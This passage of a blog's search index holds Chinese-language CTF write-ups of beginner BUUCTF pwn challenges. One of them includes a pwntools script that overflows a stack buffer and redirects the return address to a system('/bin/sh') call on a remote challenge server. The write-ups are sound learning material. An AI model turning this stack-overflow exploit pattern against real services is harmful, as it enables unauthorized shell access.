-<h3 id="0x04-thinking"><a href="#0x04-thinking" class="headerlink" title="0x04 thinking"></a>0x04 thinking</h3><p>这题跟上一题一样，都是栈溢出，都是将某个后门函数的地址覆盖掉返回地址<br>一开始没反应过来cat flag.txt可以直接用，还在那找&#x2F;bin&#x2F;sh,<br>还是对信息不太敏感……<br>不过对栈的相关知识的学习还是让人感觉有收获的</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week1 T2</title>
-    <url>/posts/ca38ece3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-rip"><a href="#T2-rip" class="headerlink" title="T2 rip"></a>T2 rip</h2><blockquote>
-<p>2023-01-04WP<br>BUUCTF pwn第二题<br>考点：简单的栈溢出</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><p>查看保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-58b53c6902894211862d4148de61eaa1_1440w.webp"><br>啥都没开，非常nice</p>
-<h3 id="0x02-IDA"><a href="#0x02-IDA" class="headerlink" title="0x02 IDA"></a>0x02 IDA</h3><p>file后是64位，扔到IDA里<br><img data-src="https://pic4.zhimg.com/80/v2-7006f2599ec061a9ccd9e41370a2c34b_1440w.webp"><br>打开string window,发现有&#x2F;bin&#x2F;sh，双击-》点击command,ctrl+X跳到fun函数里<br><del>Function window直接找也行….</del><br><img data-src="https://pic2.zhimg.com/80/v2-42111c4151f4950164f04d213c23e9bd_1440w.webp"><br>直接f5大法<br>main函数里好像没啥用<br>看到char了一个s数组还有get函数，栈溢出无疑了<br><img data-src="https://pic3.zhimg.com/80/v2-21033c9a0be0c615a751be12c50d7a6a_1440w.webp"><br>fun函数里有system函数，想到把fun函数的地址压进栈的return address里使fun函数得以执行<br>于是找出fun函数中调用system的地址0x40118A<br><img data-src="https://pic2.zhimg.com/80/v2-23ce5525745d5b11353c4a0c792f0edd_1440w.webp"><br>有了地址，现在需要知道的是s的长度，在IDA中可以找到<br><img data-src="https://pic1.zhimg.com/80/v2-a94f13524837503afef423f2bcea458c_1440w.webp"><br>距离rbp的距离是0Fh，也就是s的内存空间为15字节,当然了，除此之外，还需要8字节的数据将rbp填满，才能让数据溢过Local Variables 和 Caller’s rsp，溢出进入Return Address</p>
-<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><p>vim pwn1.py<br><code>#pwn1.py from pwn import * p = remote(&quot;node4 .buuoj.cn&quot;,25026) payload = b&#39;a&#39; * (0xf+8) + p64(0x40118A) p.sendline(payload) p.interactive() </code><br><del>一开始没加b’’然后报错TypeError: can only concatenate str (not “bytes”) to str……</del><br>执行脚本得到flag<br><img data-src="https://pic2.zhimg.com/80/v2-8cf32a5f0007c9057c530f3e4be55c6d_1440w.webp"></p>
-<h3 id="0x04-补充一些知识"><a href="#0x04-补充一些知识" class="headerlink" title="0x04 补充一些知识"></a>0x04 补充一些知识</h3><p>IDA栈帧视窗详细说明：<a href="https://blog.csdn.net/u012206617/article/details/87717310">这篇文章</a><br><a href="https://blog.csdn.net/ComputerInBook/article/details/126840323">这篇文章</a>举了一个例子详细说明</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week1 T1</title>
-    <url>/posts/5331bd59/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
-<p>2023-01-03WP<br>BUUCTF pwn第一题</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="一、用checksec检测文件保护机制"><a href="#一、用checksec检测文件保护机制" class="headerlink" title="一、用checksec检测文件保护机制"></a>一、用checksec检测文件保护机制</h3><p>下载文件，checksec得知已开启NX保护<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>（奇怪的是checksec没有给出文件位数，后来还是file了一下得到是64位）</p>
-<h3 id="二、打开IDA"><a href="#二、打开IDA" class="headerlink" title="二、打开IDA"></a>二、打开IDA</h3><p>将文件扔到IDA中，按下shift+f12,打开string window，发现&#x2F;bin&#x2F;sh<br><img data-src="https://pic4.zhimg.com/v2-fbe627c7dd17761ef3bc56360d884f27_r.jpg"><br>双击&#x2F;bin&#x2F;sh，点击command，交叉引用快捷键X，发现地址在main函数里<br><img data-src="https://pic1.zhimg.com/80/v2-84f08756aa27af34ed8fa47762094234_1440w.webp"><br>按下f5确定main函数就是一个简单地调用了&#x2F;bin&#x2F;sh的system函数<br><img data-src="https://pic2.zhimg.com/80/v2-06f1ca937f2820c16be174944ebde851_1440w.webp"><br><del>(其实感觉前两步就这题来说没必要……但是看一篇博客说拿到文件先checksec一下再IDA一下于是想试一下……)</del></p>
-<h3 id="三、结合题目提示可知直接nc"><a href="#三、结合题目提示可知直接nc" class="headerlink" title="三、结合题目提示可知直接nc"></a>三、结合题目提示可知直接nc</h3><p><del>（这个地方一开始报错，仔细一看发现ctrl cv过来的端口那里还有一个：得把冒号去掉……）</del><br>ls列出文件目录<br><img data-src="https://pic4.zhimg.com/80/v2-d117911f69f0b5cdc99a9a7c5352489b_1440w.webp"><br>发现flag，用cat（concatenate，命令用于连接文件并打印到标准输出设备上）抓取flag得<br><img data-src="https://pic2.zhimg.com/80/v2-c7068e97c98c8f0dc5a292df9ab746cd_1440w.webp"></p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>BUUCTF</tag>
       </tags>
   </entry>
 </search>
